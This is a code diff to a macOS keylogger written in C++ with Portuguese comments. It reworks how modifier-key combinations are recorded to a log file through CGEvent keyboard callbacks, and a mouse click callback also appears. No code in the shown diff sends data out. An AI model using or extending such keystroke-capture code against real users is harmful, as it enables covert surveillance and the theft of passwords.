@@ -2,6 +2,7 @@
 #include "KSVKeyboard.h"
 #include "KSVLogger.h"
 #include "KSVMouse.h"
+#include "KSVConfig.h"
 #include <iostream>
 
 // executa ao criar a thread
@@ -97,14 +98,63 @@ void Keylogger::initializeMouseTracker() {
 // -----------------------------------------------------------   TECLADO   ------------------------------------------------------- \\
 // ------------------------------------------------------------------------------------------------------------------------------- \\
 
-// Estado de teclas de função (shift, cmd, option, ... )
+// Estado de teclas modificadoras (shift, cmd, option, ... )
 // 0 = nada acontecendo, não se trata de uma tecla de função
 // 1 = a tecla esta pressionada e o próximo estado é o 2 (será solta)
 // 2 = a tecla não esta mais sendo pressionada e o próximo status é 0
-int fnKeyActive = 0;
+int MDFKeysState[KSV_MDF_MEMORY_ALLOCATION];
 
-// A tecla pressionada anteriormente
-int lastKeyCode = -1;
+bool isMDFReleased = true;
+bool MDFGroupInitialized = false;
+
+void loggerMDFKey(Logger *logger, const char *parsedKey) {
+    logger->write("[m:");
+    logger->write(parsedKey);
+    logger->write("]");
+}
+
+/**
+ * Cria o grupo de teclas modificadoras, combinado com teclas normais.
+ * Tudo que for pressionado enquanto uma ou mais teclas modificadoras estiverem ativas, é gravado dentro do grupo.
+ */
+void Keylogger::CGKeyboardModifierInputEventCallback(CGEventType type, CGEventRef event, const char *parsedKey, int keyCode, Logger *logger) {
+
+    CGEventFlags flag = CGEventGetFlags(event);
+
+    // Significa que uma ou mais MDF KEY esta ON HOLD
+    if (flag != 256) {
+
+        // Grupo não iniciado
+        if (!MDFGroupInitialized) {
+
+            // Inicia o grupo
+            logger->write("[{");
+
+            // Marca a inicialização
+            MDFGroupInitialized = true;
+
+            // Grava a tecla MDF que iniciou o grupo
+            loggerMDFKey(logger, parsedKey);
+
+        } else {
+
+            // Apenas gravar as proximas teclas MDF  (Nota: Além de teclas MDF, teclas normais são gravadas durante um grupo)
+            loggerMDFKey(logger, parsedKey);
+        }
+    } else {
+
+        // Grava a ultima tecla MDF
+        loggerMDFKey(logger, parsedKey);
+
+        // Fecha o grupo
+        logger->write("}]");
+
+        // Finaliza o identificador de grupo, para reabrir na proxima combinação MDF
+        MDFGroupInitialized = false;
+    }
+
+}
+
 
 /**
  * Registra no arquivo de log a tecla pressionada
@@ -117,55 +167,11 @@ CGEventRef Keylogger::CGKeyboardInputEventCallback(CGEventTapProxy proxy, CGEven
     int64_t isInAutoRepeat = CGEventGetIntegerValueField(event, kCGKeyboardEventAutorepeat);
 
     const char *parsedKey = Keyboard::convertKeyCode(keyCode);
-    bool isFnKey = Keyboard::isFnKey(keyCode);
+    bool isFnKey = Keyboard::isMDFKey(keyCode);
 
     // Se for uma tecla de função, a variavel [fnKeyActive] começara a ganhar alterações de status
     if (isFnKey) {
-
-        // Status 1 deve ser aplicado, pois a tecla anterior não é conhecida, ou é diferente, então é o primeiro siclo de uma tecla fn
-        if (lastKeyCode == -1) {
-            fnKeyActive = 1; // status pressionado inicialmente
-            lastKeyCode = keyCode;
-        } else {
-
-            // Se a tecla pressionada agora, for a mesma pressionada antes, deve-se verificar o fnKeyActive para determinar o status
-            if (keyCode == lastKeyCode) {
-
-                // Se estiver no status 1, deve alterar para o status 2.
-                if (fnKeyActive == 1) {
-                    fnKeyActive = 2;
-                } else if (fnKeyActive == 2) { // apenas por precaução, to preocupado só!
-                    fnKeyActive = 1;
-                } else if (fnKeyActive == 0) {
-                    fnKeyActive = 1;
-                }
-
-            } else {
-                // TODO - Problema quando troca de tecla
-
-                if (fnKeyActive == 0) {
-                    fnKeyActive = 1;
-                } else if (fnKeyActive == 1) {
-                    fnKeyActive = 2;
-                } else if (fnKeyActive == 2) {
-                    fnKeyActive = 0;
-                }
-            }
-
-        }
-
-    } else {
-        fnKeyActive = 0;
-    }
-
-    // Armazeno na memória a tecla pressionada no presente, que será a tecla do passado no futuro. 8)
-    lastKeyCode = keyCode;
-
-    if (isFnKey) {
-        logger->write("[f:");
-        logger->write(fnKeyActive);
-        logger->write(parsedKey);
-        logger->write("]");
+        CGKeyboardModifierInputEventCallback(type, event, parsedKey, keyCode, logger);
     } else {
         logger->write("[k:");
         logger->write(isInAutoRepeat);
@@ -181,7 +187,6 @@ CGEventRef Keylogger::CGKeyboardInputEventCallback(CGEventTapProxy proxy, CGEven
 
         logger->write("]");
     }
-
 
     return event;
 }
@@ -262,6 +267,8 @@ CGEventRef Keylogger::CGMouseClickEventCallback(CGEventTapProxy proxy, CGEventTy
 
     return event;
 }
+
+
 
 
 
